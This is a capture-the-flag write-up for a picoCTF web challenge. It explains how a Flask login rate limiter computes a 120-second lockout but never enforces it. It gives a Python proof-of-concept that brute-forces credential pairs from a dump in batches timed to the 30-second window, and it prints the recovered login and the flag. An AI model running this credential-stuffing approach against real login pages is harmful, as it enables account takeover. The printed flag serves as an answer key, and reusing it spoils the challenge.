# Fool the Lockout

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{f00l_7h4t_l1m1t3r_24180dc6}`

## Summary

A Flask login page implements an IP-based rate limiter meant to lock an IP out for 120 seconds
after 10 failed attempts. The lockout timestamp is calculated and stored, but the code that
decides whether to actually block a request never checks it. The only real gate is a 30 second
attempt-counter window, so waiting slightly longer than 30 seconds between batches of 10 attempts
resets the counter and lets credential stuffing continue indefinitely, well before the intended
120 second lockout would have expired.

## Discovery

The full source (`app.py`) is provided. The relevant constants:

```python
MAX_REQUESTS = 10
EPOCH_DURATION = 30
LOCKOUT_DURATION = 120
```

`refresh_request_rates_db` resets the per-IP attempt counter once `EPOCH_DURATION` (30s) has
elapsed since the first attempt in the current window:

```python
def refresh_request_rates_db(client_ip):
    curr_time = time.time()
    if client_ip not in request_rates:
        return
    epoch_start_time = request_rates[client_ip]["epoch_start"]
    if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
        request_rates[client_ip]["epoch_start"] = -1

    lockout_end = request_rates[client_ip]["lockout_until"]
    if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1
```

`exceeded_rate_limit` is the function that actually decides whether to block:

```python
def exceeded_rate_limit() -> bool:
    ...
    refresh_request_rates_db(client_ip)
    ...
    if request.method == "POST":
        request_rates[client_ip]['num_requests'] += 1
        ...
    if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
        if request_rates[client_ip]["lockout_until"] == -1:
            request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
        return True
    return False
```

The block decision is based purely on `num_requests > MAX_REQUESTS`. `lockout_until` gets set as
a side effect once that threshold is crossed, but nothing in this function (or anywhere else)
checks `lockout_until` before returning `False`. Since `num_requests` gets reset back to 0 by the
30 second epoch check regardless of whether a lockout was ever recorded, the 120 second
`LOCKOUT_DURATION` value is calculated, stored, and then never actually enforced.

## Proof of Concept

Send credential pairs from the provided dump in batches of 10 POST attempts, sleeping just over
30 seconds between batches instead of the intended 120:

```python
import requests, time

BASE = "http://TARGET"
session = requests.Session()
pairs = [line.strip().split(";", 1) for line in open("creds-dump.txt") if ";" in line]

for i in range(0, len(pairs), 10):
    batch = pairs[i:i+10]
    for user, pw in batch:
        r = session.post(f"{BASE}/login", data={"username": user, "password": pw},
                          allow_redirects=False, timeout=10)
        if r.status_code in (301, 302, 303, 307, 308):
            print("SUCCESS:", user, pw)
            break
    time.sleep(31)
```

The valid pair `paulo:chicks` is found on the fourth batch (40 total attempts, well past what a
correctly-enforced 120 second lockout after every 10 attempts would have allowed in the same
wall-clock time). Logging in and loading the homepage returns:

```
Welcome paulo
picoCTF{f00l_7h4t_l1m1t3r_24180dc6}
```

## Root Cause

A time-window based counter (`epoch_start`/`EPOCH_DURATION`) and an actual lockout flag
(`lockout_until`/`LOCKOUT_DURATION`) were implemented as two separate mechanisms, but only the
counter reset is wired into the code path that decides whether to block a request. The lockout
value is computed and stored but is dead code as far as enforcement goes, so the real effective
throttle is the much shorter epoch window rather than the intended lockout duration.

## CWE / OWASP

- **CWE-841**: Improper Enforcement of Behavioral Workflow
- **CWE-307**: Improper Restriction of Excessive Authentication Attempts
- **OWASP A07:2021**: Identification and Authentication Failures
